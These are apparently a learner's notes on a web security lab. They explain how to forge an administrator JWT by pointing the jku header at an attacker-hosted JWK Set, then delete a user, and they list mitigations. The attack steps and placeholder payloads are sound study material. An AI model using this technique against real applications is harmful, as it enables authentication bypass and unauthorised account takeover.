# Lab05 - JWT Authentication Bypass Via JKU Header Injection

## Objective

Forge a JWT that grants administrator access using the `jku` header.

Delete:

```text
carlos
```

Credentials:

```text
wiener:peter
```

---

# Vulnerability Overview

The application supports the JWT `jku` header.

Instead of embedding the public key directly, the server downloads a JWK Set from the URL specified in `jku`.

The vulnerability occurs because the server does not validate that the URL belongs to a trusted source.

---

# Attack Flow

```text
Generate RSA Key
        ↓
Host Public JWK
        ↓
Set jku To Attacker URL
        ↓
Sign JWT
        ↓
Server Downloads Attacker Key
        ↓
JWT Accepted
```

---

# Part 1 - Create A Malicious JWK Set

Generate a new RSA key using Burp JWT Editor.

Copy the public key as JWK.

On the exploit server create:

```json
{
  "keys": [
    {
      "...": "Attacker Public JWK"
    }
  ]
}
```

Store the exploit.

---

# Part 2 - Modify The JWT

Modify:

```json
{
    "sub":"administrator"
}
```

Replace:

```text
kid
```

with the Key ID from your uploaded JWK.

Add:

```json
{
   "jku":"https://exploit-server/.../jwks.json"
}
```

Sign using your RSA private key.

---

# Part 3 - Replay

Request:

```http
GET /admin
```

The server downloads the attacker's JWK Set.

Signature verification succeeds.

Administrator access is granted.

Delete:

```text
carlos
```

---

# Why It Works

```text
Attacker Controls jku
        ↓
Server Downloads Key
        ↓
Server Trusts Wrong Key
```

---

# Personal Analysis

Whenever I see:

```text
jku
```

I immediately ask:

```text
Can I Control The URL?

Does The Server Validate The Domain?
```

---

# Bug Bounty Indicators

```text
jku Header
Remote JWKS
External Key Retrieval
```

---

# Impact

```text
Authentication Bypass
JWT Forgery
Privilege Escalation
```

---

# Mitigation

```text
Allowlist JWKS URLs

Never Fetch Arbitrary Keys

Validate Trusted Issuers
```

---

# Related Theory

```text
11-jku-header-injection.md
```

---

# Key Learnings

The attacker should never be allowed to decide where verification keys come from.